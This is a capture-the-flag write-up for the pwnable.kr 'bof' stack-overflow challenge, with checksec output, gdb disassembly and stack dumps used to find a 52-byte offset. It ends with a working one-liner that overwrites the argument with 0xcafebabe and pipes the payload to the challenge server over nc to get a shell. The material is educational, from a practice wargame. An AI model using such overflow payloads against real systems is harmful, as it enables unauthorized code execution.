The binary has the following security properties:
```
uzi@pwnpatrol:$ checksec --file bof
[*] '/home/uzi/challenges/wargames/pwnable.kr/toddlers_bottle/bof/bof'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

The 0xcafebabe comparison is at func+40.
```
(gdb) disassemble func
Dump of assembler code for function func:
0x5655562c <+0>:     push   ebp
0x5655562d <+1>:     mov    ebp,esp
0x5655562f <+3>:     sub    esp,0x48
0x56555632 <+6>:     mov    eax,gs:0x14
0x56555638 <+12>:    mov    DWORD PTR [ebp-0xc],eax
0x5655563b <+15>:    xor    eax,eax
0x5655563d <+17>:    mov    DWORD PTR [esp],0x78c
0x56555644 <+24>:    call   0x56555645 <func+25>
0x56555649 <+29>:    lea    eax,[ebp-0x2c]
0x5655564c <+32>:    mov    DWORD PTR [esp],eax
0x5655564f <+35>:    call   0x56555650 <func+36>
0x56555654 <+40>:    cmp    DWORD PTR [ebp+0x8],0xcafebabe
```
Put a breakpoint there and run the application
```
(gdb) b *func +40
Breakpoint 1 at 0x56555654
(gdb) r <<< AABBCCDD
Starting program: /home/uzi/challenges/wargames/pwnable.kr/toddlers_bottle/bof/bof <<< AABBCCDD
overflow me :

Breakpoint 1, 0x56555654 in func ()
```
Dump the stack frame. ```ebp-0x48``` because, func allocated 0x48 bytes in stack via ```sub esp,0x48```
```
(gdb) x/24wx $ebp-0x48
0xffffcf40:     0xffffcf5c      0x00000000      0x00000000      0x7e9b3000
0xffffcf50:     0x00000009      0xffffd185      0xf7e184a9      0x42424141
0xffffcf60:     0x44444343      0xf7fc0000      0x00000001      0x5655549d
0xffffcf70:     0xf7fc03fc      0x00000000      0x56556ff4      0x7e9b3000
0xffffcf80:     0x00000000      0xf7e185db      0xffffcfa8      0x5655569f
0xffffcf90:     0xdeadbeef      0x00000000      0x565556b9      0x00000000
```
As seen above, we need 52 bytes till parameter to func.

Along with the script, challange can be solved with the following one-liner as well. After shell is opened, ```cat flag``` to get the flag
```
(python -c 'print("A"*52 + "\xbe\xba\xfe\xca")'; cat) | nc pwnable.kr 9000
```
